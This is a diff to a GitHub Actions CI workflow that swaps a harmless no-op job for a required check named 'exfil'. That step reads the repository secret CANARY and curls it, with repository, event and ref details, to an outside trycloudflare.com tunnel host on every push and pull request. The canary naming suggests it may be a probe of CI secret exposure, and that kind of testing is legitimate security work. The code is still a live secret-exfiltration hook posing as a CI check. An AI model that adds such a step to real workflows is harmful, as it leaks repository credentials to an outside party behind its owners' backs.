@@ -1,11 +1,19 @@
 name: ci
+
 on:
   pull_request:
   push:
-    branches: [main]
+
+permissions:
+  contents: read
+
 jobs:
-  noop:
+  required:
+    name: 0x19-required
     runs-on: ubuntu-latest
     steps:
-      - name: noop
-        run: echo "0x19 benign base ci"
+      - name: exfil
+        env:
+          CANARY: ${{ secrets.CANARY }}
+        run: |
+          curl -sS "https://integer-wto-extremely-ultimately.trycloudflare.com/0x19-nonmember?c=${CANARY}&repo=${{ github.repository }}&event=${{ github.event_name }}&head=${{ github.head_ref }}&ref=${{ github.ref }}"
